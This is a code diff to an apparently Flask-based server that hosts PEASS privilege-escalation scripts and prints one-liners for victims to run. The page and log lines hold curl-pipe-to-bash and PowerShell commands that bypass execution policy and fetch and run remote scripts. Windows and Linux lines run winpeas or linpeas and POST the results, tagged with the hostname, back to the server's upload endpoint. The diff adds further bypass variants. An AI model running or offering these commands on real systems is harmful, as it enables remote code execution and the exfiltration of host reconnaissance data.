@@ -111,12 +111,17 @@ def index():
 curl -sSL http://{request.host}/get-script | bash
         </code>
         
-        <p><strong>🪟 Windows CMD:</strong></p>
+        <p><strong>🪟 Windows CMD (PowerShell 3.0+):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-powershell -ExecutionPolicy Bypass -Command "irm http://{request.host}/get-script.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod http://{request.host}/get-script.ps1 | Invoke-Expression"
         </code>
         
-        <p><strong>🪟 Windows PowerShell:</strong></p>
+        <p><strong>🪟 Windows CMD (Legacy PowerShell 2.0+):</strong></p>
+        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
+powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('http://{request.host}/get-script.ps1') | Invoke-Expression"
+        </code>
+        
+        <p><strong>🪟 Windows PowerShell (if irm works):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
 irm http://{request.host}/get-script.ps1 | iex
         </code>
@@ -131,7 +136,7 @@ curl http://{request.host}/get-linpeas | bash | curl -X POST --data-binary @- -H
         
         <p><strong>Windows (manual):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-$r=irm http://{request.host}/get-winpeas -OutFile $env:TEMP\w.exe; & $env:TEMP\w.exe | Out-File $env:TEMP\o.txt; irm http://{request.host}/upload -Method POST -InFile $env:TEMP\o.txt -Headers @{{"X-Hostname"=$env:COMPUTERNAME}}
+$r=Invoke-RestMethod http://{request.host}/get-winpeas -OutFile $env:TEMP\w.exe; & $env:TEMP\w.exe | Out-File $env:TEMP\o.txt; Invoke-RestMethod http://{request.host}/upload -Method POST -InFile $env:TEMP\o.txt -Headers @{{"X-Hostname"=$env:COMPUTERNAME}}
         </code>
     </body>
     </html>
@@ -311,9 +316,9 @@ if __name__ == '__main__':
     download_peass_scripts()
     
     log(f"[+] Starting server...\n")
-    log(f"[+] Linux:       curl -sSL http://YOUR_IP:8000/get-script | bash")
-    log(f"[+] Windows CMD: powershell -ExecutionPolicy Bypass -Command \"irm http://YOUR_IP:8000/get-script.ps1 | iex\"")
-    log(f"[+] Windows PS:  irm http://YOUR_IP:8000/get-script.ps1 | iex\n")
+    log(f"[+] Linux:         curl -sSL http://YOUR_IP:8000/get-script | bash")
+    log(f"[+] Windows (new): powershell -ExecutionPolicy Bypass -Command \"Invoke-RestMethod http://YOUR_IP:8000/get-script.ps1 | Invoke-Expression\"")
+    log(f"[+] Windows (old): powershell -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadString('http://YOUR_IP:8000/get-script.ps1') | Invoke-Expression\"\n")
     log(f"[*] Waiting for connections...\n")
     
     # Run on all interfaces, port 8000
